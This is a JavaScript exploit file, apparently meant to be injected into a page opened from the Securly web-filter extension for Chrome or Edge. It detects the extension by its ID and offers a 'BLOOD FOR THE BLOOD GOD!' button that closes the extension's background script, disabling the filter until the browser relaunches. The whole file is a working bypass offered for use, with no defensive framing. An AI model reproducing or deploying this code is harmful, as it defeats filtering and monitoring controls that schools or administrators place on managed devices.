function stopExtensionBackgroundScript() {
  opener.chrome.extension.getBackgroundPage().close();
  alert("Done!  Extension background script should now be stopped until Chrome relaunches.")
}

if (document.getElementById("point_blank_bsod_edition_header") === null){
  document.write(`<style>.contents{padding:24px;display:flex;justify-content:center}.content-wrapper{max-width:800px;width:100%;border:4px blue dashed;border-radius:16px;padding:8px}body{color-scheme:dark;margin:0;background-color:black;color:white}.website-title-align{text-align:center;width:100%;display:inline-block}.content{margin:16px}.links-wrapper{position:fixed;bottom:16px;right:16px;padding:8px;border:4px blue dashed;border-radius:16px}.links{padding:4px}#UwU{border-radius:4px;border:2px lime solid;background-color:rgb(0, 192, 0)}#OwO{border-radius:4px;border:2px #ff3300 solid;background-color:#990000}</style>`)
  
  
  document.write(`<div class="contents"><div class="content-wrapper"><span id="website-title" class="website-title-align"><h1 id="point_blank_bsod_edition_header">The Securly (and potentially others) Murderer</h1></span><span id="website-subtitle" class="website-title-align"><i>By <a href="https://fedi.bangsparks.com/@CauseOfBSOD">CauseOfBSOD</a></i></span><div class="content"><p>v1.0.0</p></div></div></div><div class="contents"><div class="content-wrapper"><div class="content">`);
  
  if (document.domain == "dfkheabholbfmmehflddbknjimnjelda") {
    // securly edge
    document.write(`<h1>Exploitable context found!</h1><p>(Securly for Edge)</p><br><center><button id="OwO">BLOOD FOR THE BLOOD GOD!</button><button id="UwU">Abort</button></center>`);
  } else if (document.domain == "iheobagjkfklnlikgihanlhcddjoihkg"){
    // securly chrome
    document.write(`<h1>Exploitable context found!</h1><p>(Securly for Chrome)</p><br><center><button id="OwO">BLOOD FOR THE BLOOD GOD!</button><button id="UwU">Abort</button></center>`);
  } else if (document.domain == "") {
    document.write(`<h1>No exploitable context found.</h1><p>No access to another page detected - exploit almost certainly will not work.</p><br><center><button id="OwO">Try anyway</button><button id="UwU">Abort</button></center>`);
  } else {
    document.write(`<h1>Unrecognised context.</h1><p>Access to another page detected but not a recognised extension - exploit may or may not work.</p><br><center><button id="OwO">Try anyway</button><button id="UwU">Abort</button></center>`);
  }
  
  document.write(`</div></div></div><div class="links-wrapper"><span class="links"><img src="https://bangsparks.com/verified_causeofbsod.png"></span></div>`)
  
  // event listeners must be wrapped in anonymous functions otherwise we get an illegal invocation error
  document.getElementById("UwU").addEventListener("click", function(){window.close();});
  document.getElementById("OwO").addEventListener("click", function() {stopExtensionBackgroundScript();}, !1);
} else {alert("The code has already been injected - aborting!");}
